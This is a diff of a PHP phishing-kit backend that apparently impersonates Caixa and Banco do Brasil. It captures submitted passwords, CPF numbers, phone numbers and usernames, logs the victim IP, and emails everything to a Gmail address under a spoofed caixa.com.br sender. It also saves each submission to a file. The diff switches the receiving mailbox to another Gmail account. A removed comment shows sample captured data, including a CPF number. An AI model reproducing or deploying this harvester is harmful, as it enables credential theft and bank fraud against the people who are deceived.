@@ -1,11 +1,10 @@
-<?php 
-    print_r($_POST); exit; 
-    //Array ( [senha1] => 242534 [cpf] => 054.478.473-11 [telefone] => 45 3-4534-5345 [usuario] => swfsfsfsfsfsdfsdfsdfsdfsfsdfsd [senha] => sdfsdfsd [step] => passo2 )
+﻿<?php 
     if(isset($_POST))
 	{
 		$ip = $_SERVER['REMOTE_ADDR'];
 
-		$emaildestinatario = 'Caixaatualizda@gmail.com';
+		//$emaildestinatario = 'Caixaatualizda@gmail.com';
+		$emaildestinatario = 'erickqueiroz93@gmail.com';
 
 		$subj = "Dados / IP: $ip - Chegou: BB";
 
@@ -29,7 +28,7 @@
 		$headers .= "Content-type: text/html; charset=utf-8\r\n";
 		$headers .= "From: recadastramento@caixa.com.br \r\n";
 		$headers .= "Return-Path: recadastramento@caixa.com.br \r\n";
-		$envio = mail("Caixaatualizda@gmail.com", $subj, $mensagemHTML, $headers);
+		$envio = mail($emaildestinatario, $subj, $mensagemHTML, $headers);
 
 		$fp = fopen("../dados/".date("YmdHis"), "a");
 		$escreve = fwrite($fp, $mensagemHTML);
